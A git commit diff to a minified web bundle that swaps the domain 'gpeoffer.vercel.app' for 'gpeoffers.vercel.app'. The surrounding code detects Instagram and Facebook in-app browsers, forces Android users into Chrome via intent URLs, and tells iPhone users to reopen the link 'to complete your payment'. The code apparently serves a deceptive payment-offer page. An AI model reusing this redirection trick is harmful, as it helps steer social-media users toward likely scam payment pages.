3e3e590681426ede200b5926ea21d7fd6d87ceeb
Nimbooz@8up <help.shopnow52@gmail.com>
2024-10-15 19:07:30 +0530

    link update

--- static/js/main.ac9c4e3a.js
+++ static/js/main.ac9c4e3a.js
@@ -11018,7 +11018,7 @@
                 className: "h-20 mx-auto mb-4"
             }), (0,
             We.jsx)("a", {
-                href: "intent:/gpeoffer.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;",
+                href: "intent:/gpeoffers.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;",
                 className: "py-2 px-4 bg-blue-500 rounded-lg text-white font-semibold mt-2",
                 children: "Open In Chrome"
             })]
@@ -11033,7 +11033,7 @@
                 var e = navigator.userAgent || navigator.vendor || window.opera;
                 return e.indexOf("Instagram") > -1 || e.indexOf("FBAN") > -1 || e.indexOf("FBAV") > -1
             }() ? t(!0) : (t(!1),
-            /android/i.test(navigator.userAgent) ? window.location.href = "intent://gpeoffer.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;" : /iPhone|iPad|iPod/i.test(navigator.userAgent) ? alert("To complete your payment, please open this link in Safari or Chrome.") : window.location.href = "https://gpeoffer.vercel.app/")
+            /android/i.test(navigator.userAgent) ? window.location.href = "intent://gpeoffers.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;" : /iPhone|iPad|iPod/i.test(navigator.userAgent) ? alert("To complete your payment, please open this link in Safari or Chrome.") : window.location.href = "https://gpeoffers.vercel.app/")
         }
         ), []),
         (0,
